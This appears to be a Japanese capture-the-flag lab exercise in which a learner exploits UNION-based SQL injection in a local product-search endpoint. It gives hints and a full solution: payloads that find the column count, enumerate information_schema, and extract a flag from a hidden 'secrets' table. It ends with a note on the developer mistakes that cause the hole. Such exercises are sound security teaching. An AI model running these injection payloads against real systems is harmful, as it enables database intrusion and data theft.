# 02 - Product Search (UNION-based)

`http://localhost:3002` の商品検索から、DB内のどこかにあるflagを抜き出せ。
UIには`products`しか出てこないが、DBには別のテーブルが存在する。

## ヒント

<details><summary>ヒント1</summary>

`?q=`の値をそのままLIKE句に埋め込んでいる(`server.js`参照)。エラーはそのままJSONで返る
= 構文ミスの手がかりが丸見え。

</details>

<details><summary>ヒント2</summary>

`q=test' ORDER BY 5-- -` のように末尾のカラム数を変えて試すと、存在しないカラム番号で
エラーが出る。これでSELECTしているカラム数がわかる。

</details>

<details><summary>ヒント3</summary>

カラム数がわかったら`UNION SELECT`で任意の値を結果に混ぜ込める。
`information_schema.tables` / `information_schema.columns` に問い合わせれば、
このDBに存在する全テーブル名・カラム名がわかる(`table_schema = database()`で絞り込み)。

</details>

<details><summary>解答</summary>

1. カラム数特定:
   ```
   q=zzz' ORDER BY 4-- -
   ```
   (5にするとエラーになる → 4カラム)

2. UNION成立確認:
   ```
   q=zzz' UNION SELECT 1,'a','b',1-- -
   ```

3. テーブル名列挙:
   ```
   q=zzz' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
   ```
   → `secrets`テーブルが見つかる。

4. カラム名列挙:
   ```
   q=zzz' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secrets'-- -
   ```
   → `id`, `flag`が見つかる。

5. flag抽出:
   ```
   q=zzz' UNION SELECT id,flag,NULL,NULL FROM secrets-- -
   ```

**現実のミス**: 検索機能のLIKE句を素朴に文字列結合し、かつDBエラーをそのままクライアントに
返している(本番に残ったデバッグ設定)。エラーメッセージがカラム数特定の強力なヒントになる。

</details>
